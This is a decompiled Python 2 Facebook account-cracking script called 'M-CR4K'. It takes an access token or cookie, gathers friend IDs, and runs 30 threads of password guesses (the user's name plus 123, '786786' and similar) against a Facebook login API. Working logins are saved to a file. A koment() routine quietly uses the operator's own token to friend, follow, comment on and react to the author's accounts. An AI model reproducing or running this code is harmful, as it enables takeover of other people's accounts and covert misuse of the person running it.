# DECOMPILED BY HUNTERBOY ALAMIN
# FACEBOOK : MD ALAMIN KHAN
# CONTACT : https://t.me/alamin123khan
try:
    import itertools, os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, mechanize, requests, uuid
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
    from datetime import datetime
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system('python2 M-CR4K.so')

from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
user_ms = requests.get('https://raw.githubusercontent.com/mohammadjan1122/H4CK-FB/master/user_agent.txt').text.strip()
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-Telkomsel': repr(sim), 'x-fb-net-Telkomsel': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyLTE', 'user-agent': user_ms, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
os.system('clear')

def exit():
    jalan('\nSee you soon\n')
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i
        return cetak(d)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;95m \xe2\x80\xa2\x1b[1;96m Memeriksa Key ' + o,
        sys.stdout.flush()
        time.sleep(1)


idh = []
cps = []
cp = []
ok = []
oks = []
back = 0
threads = []

def login_fb():
    os.system('clear')
    print logo
    time.sleep(0.07)
    print '[01]Login With Token'
    time.sleep(0.07)
    print '[02]Login With Cookie '
    time.sleep(0.07)
    print '[03]my facebook account '
    time.sleep(0.07)
    print '[04]my Telegram Channel '
    time.sleep(0.07)
    print ' [00] Exit'
    time.sleep(0.07)
    print 48 * '\x1b[1;91m\xe2\x94\x80'
    time.sleep(0.07)
    chose_login_fb()


def chose_login_fb():
    mi = raw_input('\x1b[1;96m M-CR4K Choose option:>>>')
    if mi == '01':
        os.system('clear')
        print logo
        token = raw_input(' Enter Fb Token : >>>')
        sav = open('.token.txt', 'w')
        sav.write(token)
        sav.close()
        jalan('                       ')
        print ' Login succesful'
        koment()
    if mi == '02':
        cookie()
    elif mi == '03':
        os.system('xdg-open https://m.facebook.com/mohammad.hacker.1122')
    elif mi == '04':
        os.system('xdg-open https://T.me/sultani1122')
        login_fb()
    elif mi == '00':
        exit()


def cookie():
    print logo
    print '\n  How To Get Token : https://t.me/sultani1122/5296'
    print '\n  How To Get Cookie : https://t.me/sultani1122/5840'
    cookie = raw_input('Enter  Your Cookie : >>> \x1b[0;96m')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Your Cookie Invalid' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] No Connection'

    cookie = open('.token.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    koment()
    return


def koment():
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m [!] Token invalid'
        os.system('rm -rf .token.txt')

    una = '100027060438331'
    kom = ' mohammad sultani\xf0\x9f\x98\x98'
    post = '834886427423364'
    kom2 = 'hi mohammad sultani i am user  M-CR4K script  \xf0\x9f\x98\x81'
    reac2 = 'LOVE'
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + una + '&access_token=' + token)
    requests.post('https://graph.facebook.com/100027060438331/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100009918107424/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom2 + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac2 + '&access_token=' + token)
    ms_menu()


def ms_menu():
    os.system('clear')
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m [!] Token invalid'
        os.system('rm -rf .token.txt')
        time.sleep(1)
        login_fb()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
        a = json.loads(r.text)
        name = a['name']
    except KeyError:
        os.system('clear')
        print ' \x1b[1;91m[!] Token invalid'
        os.system('rm -rf .token.txt')
        time.sleep(1)
        login_fb()
    except requests.exceptions.ConnectionError:
        print '\n [!] no Enternet  connection\n '
        os.sys.exit()

    os.system('clear')
    print logo
    ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
    jalan('welcome   \x1b[1;92m' + name + '\x1b[1;93m ]')
    print 48 * '_'
    time.sleep(0.07)
    print 'your  IP: ' + ip + '  '
    time.sleep(0.07)
    print 48 * '_'
    time.sleep(0.07)
    print ' [1] Start Crack'
    time.sleep(0.07)
    print 48 * ' '
    print ' [2] SETTING USER AGENT '
    time.sleep(0.07)
    print 48 * ' '
    print ' [3] Follow/Add My Facebook'
    time.sleep(0.07)
    print 48 * ' '
    print ' [4] Update  M-CR4K Script'
    time.sleep(0.07)
    print 48 * ' '
    print ' [5] My Telegram group '
    time.sleep(0.07)
    print 48 * ' '
    print ' [0] Exit'
    print 48 * ' '
    time.sleep(0.07)
    print 48 * ' '
    time.sleep(0.07)
    chose_crack()


def group():
    os.system('clear')
    print logo
    os.system('xdg-open https://t.me/Mking_script')
    raw_input('\n\x1b[1;91m back')
    ms_menu()


def chose_crack():
    ms = raw_input(' M-CR4K Choose option :>>> ')
    if ms == '1':
        ms_start()
    elif ms == '5':
        group()
    elif ms == '3':
        ms_fb()
    elif ms == '4':
        os.system('clear')
        update()
    elif ms == '2':
        setting_user()
    elif ms == '0':
        print '\n\x1b[0;97m exit\x1b[0;97m'
        os.sys.exit()
    else:
        print '\x1b[1;91m [!] Wrong Input'
        chose_crack()


logo = '\n\n\n #     #          #####   ######   #        #    # \n ##   ##         #     #  #     #  #    #   #   #  \n # # # #         #        #     #  #    #   #  #   \n #  #  #  #####  #        ######   #    #   ###    \n #     #         #        #   #    #######  #  #   \n #     #         #     #  #    #        #   #   #  \n #     #          #####   #     #       #   #    # \n                                                   \n\n--------------------------------------------------\x1a\n\x1a Author      : Mohammad Sultani \n\x1a GitHub      : https://github.com/Mohammadjan1122\n\x1a YouTube     : Termux Master\n\x1a Telegram    : https://t.me/sultani1122\n Blogspot    : https://mohammadsultani.blogspot.com\n--------------------------------------------------\n'

def ms_start():
    global token
    os.system('clear')
    try:
        token = open('.token.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m [!] Token invalid'
        os.system('rm -rf .token.txt')
        time.sleep(1)
        login_fb()

    os.system('clear')
    print logo
    print ' [1] Crack From Frend List '
    time.sleep(0.07)
    print ' [2] Crack From Public Account'
    time.sleep(0.07)
    print ' [0] back'
    time.sleep(0.07)
    print 48 * '_'
    time.sleep(0.07)
    choice_crack()


def choice_crack():
    m = raw_input('  M-CR4K Choose Option :>>> ')
    id = []
    oks = []
    cps = []
    if m == '':
        print '\x1b[1;91m [!] Wrong Input'
        choice_crack()
    elif m == '1' or m == '01':
        os.system('clear')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for s in z['data']:
            uid = s['id']
            na = s['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif m == '2' or m == '02':
        os.system('clear')
        print logo
        idt = raw_input('Enter ID  : \x1b[1;93m')
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            jalan('Nama account \x1b[1;91m: \x1b[1;93m' + q['name'])
        except KeyError:
            print '\n\x1b[1;91m [!] ID: ' + idt + ' id not  Public'
            raw_input('\n \x1b[1;91mback ')
            ms_start()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif m == '0':
        ms_menu()
    else:
        print '\x1b[1;91m [!] wrong input'
        choice_crack()
    print 'Total ID : ' + str(len(id))
    jalan('The Process Is Running In Background... ')
    jalan('To Stop Process Press CTRL +z')
    print 48 * '_'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;96m%M\x1b[1;91m:\x1b[1;96m%S')))
            sys.stdout.flush()
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = name + '123'
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '\x1b[1;93m | M-CR4K-CP | ' + uid + ' | ' + pass1
                cp = open('M-CR4K.txt', 'a')
                cp.write('\n M-CR4K-CP | ' + uid + ' | ' + pass1)
                cp.close()
                cps.append(uid + pass1)
            elif 'access_token' in d:
                print '\x1b[1;92m | M-CR4K-OK | ' + uid + ' | ' + pass1
                ok = open('M-CR4K.txt', 'a')
                ok.write('\n M-CR4K-OK | ' + uid + ' | ' + pass1)
                ok.close()
                oks.append(uid + pass1)
            else:
                pass2 = name + '12345'
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print ' \x1b[1;93m| M-CR4K-CP | ' + uid + ' | ' + pass2
                    cp = open('M-CR4K.txt', 'a')
                    cp.write('\n M-CR4K-CP | ' + uid + ' | ' + pass2)
                    cp.close()
                    cps.append(uid + pass2)
                elif 'access_token' in d:
                    print '\x1b[1;92m | M-CR4K-OK | ' + uid + ' | ' + pass2
                    ok = open('M-CR4K.txt', 'a')
                    ok.write('\n M-CR4K-OK | ' + uid + ' | ' + pass2)
                    ok.close()
                    oks.append(uid + pass2)
                else:
                    pass3 = '1234512345'
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\x1b[1;93m | M-CR4K-CP | ' + uid + ' | ' + pass3
                        cp = open('M-CR4K.txt', 'a')
                        cp.write('\n M-CR4K-CP | ' + uid + ' | ' + pass3)
                        cp.close()
                        cps.append(uid + pass3)
                    elif 'access_token' in d:
                        print '\x1b[1;92m | M-CR4K-OK | ' + uid + ' | ' + pass3
                        ok = open('M-CR4K.txt', 'a')
                        ok.write('\n M-CR4K-OK | ' + uid + ' | ' + pass3)
                        ok.close()
                        oks.append(uid + pass3)
                    else:
                        pass4 = '1122334455'
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print ' \x1b[1;93m| M-CR4K-CP | ' + uid + ' | ' + pass4
                            cp = open('M-CR4K.txt', 'a')
                            cp.write('\n M-CR4K-CP | ' + uid + ' | ' + pass4)
                            cp.close()
                            cps.append(uid + pass4)
                        elif 'access_token' in d:
                            print '\x1b[1;92m | M-CR4K-OK | ' + uid + ' | ' + pass4
                            ok = open('M-CR4K.txt', 'a')
                            ok.write('\n M-CR4K-OK | ' + uid + ' | ' + pass4)
                            ok.close()
                            oks.append(uid + pass4)
                        else:
                            pass5 = '1234554321'
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print ' \x1b[1;93m| M-CR4K-CP | ' + uid + ' | ' + pass5
                                cp = open('M-CR4K.txt', 'a')
                                cp.write('\n M-CR4K-CP | ' + uid + ' | ' + pass5)
                                cp.close()
                                cps.append(uid + pass5)
                            elif 'access_token' in d:
                                print '\x1b[1;92m | M-CR4K-OK | ' + uid + ' | ' + pass5
                                ok = open('M-CR4K.txt', 'a')
                                ok.write('\n M-CR4K-OK | ' + uid + ' | ' + pass5)
                                ok.close()
                                oks.append(uid + pass5)
                            else:
                                pass6 = '786786'
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\x1b[1;93m | M-CR4K-CP | ' + uid + ' | ' + pass6
                                    cp = open('M-CR4K.txt', 'a')
                                    cp.write('\n M-CR4K-CP | ' + uid + ' | ' + pass6)
                                    cp.close()
                                    cps.append(uid + pass6)
                                elif 'access_token' in d:
                                    print '\x1b[1;92m | M-CR4K-OK | ' + uid + ' | ' + pass6
                                    ok = open('M-CR4K.txt', 'a')
                                    ok.write('\n M-CR4K-OK | ' + uid + ' | ' + pass6)
                                    ok.close()
                                    oks.append(uid + pass6)
                                else:
                                    pass7 = '500600'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\x1b[1;93m | M-CR4K-CP | ' + uid + ' | ' + pass7
                                        cp = open('M-CR4K.txt', 'a')
                                        cp.write('\n M-CR4K-CP | ' + uid + ' | ' + pass7)
                                        cp.close()
                                        cps.append(uid + pass7)
                                    elif 'access_token' in d:
                                        print '\x1b[1;92m | M-CR4K-OK | ' + uid + ' | ' + pass7
                                        ok = open('M-CR4K.txt', 'a')
                                        ok.write('\n M-CR4K-OK | ' + uid + ' | ' + pass7)
                                        ok.close()
                                        oks.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print ' \x1b[1;36mProcess Has Been Completed'
    print 'Total \x1b[1;33mCP\x1b[1;37m/\x1b[1;32mOK:\x1b[1;33m ' + str(len(cps)) + '\x1b[1;37m/\x1b[1;32m' + str(len(oks))
    print 48 * '_'
    raw_input('\x1b[1;31m back ')
    ms_menu()


def ms_fb():
    os.system('clear')
    print logo
    jalan(' \x1b[1;32mmy  Facebook account (mohammad sultani and M S ')
    os.system('xdg-open https://www.facebook.com/mohammad.hacker.1122')
    os.system('python2 M-CR4K.so')


def update():
    os.system("echo -e '\n\n\t  update successfulled \n ' | lolcat")
    os.system('pkg update && pkg upgrade\npkg install python2\npkg install python2\npip install --upgrade pip\ngit pull origin master\nclear\ngit pull\npython2 M-CR4K.so')


def setting_user():
    ask = raw_input('\n Want to Change User Agent? [Y=yes/n=no]    y/n: ')
    if ask == '':
        ms_menu()
    elif ask == 'y' or ask == 'Y':
        try:
            print '\n Type In Chrome Search : My User Agent'
            user_ms = raw_input('   Enter User Agent : ')
            uas = open('.ua', 'w')
            uas.write(user_ms)
            uas.close()
            print ' Successfully Setting User-Agent'
            time.sleep(2)
            ms_menu()
        except KeyboardInterrupt:
            exit()

    elif ask == 'n' or ask == 'N':
        try:
            user_ms = s.get('https://raw.githubusercontent.com/mohammadjan1122/H4CK-FB/master/user_agent.txt').text.strip()
            uas = open('.ua', 'w')
            uas.write(user_ms)
            uas.close()
            print '\n Successfully Setting User-Agent'
            time.sleep(2)
            ms_menu()
        except KeyboardInterrupt:
            exit()

    else:
        ms_menu()


if __name__ == '__main__':
    ms_menu()
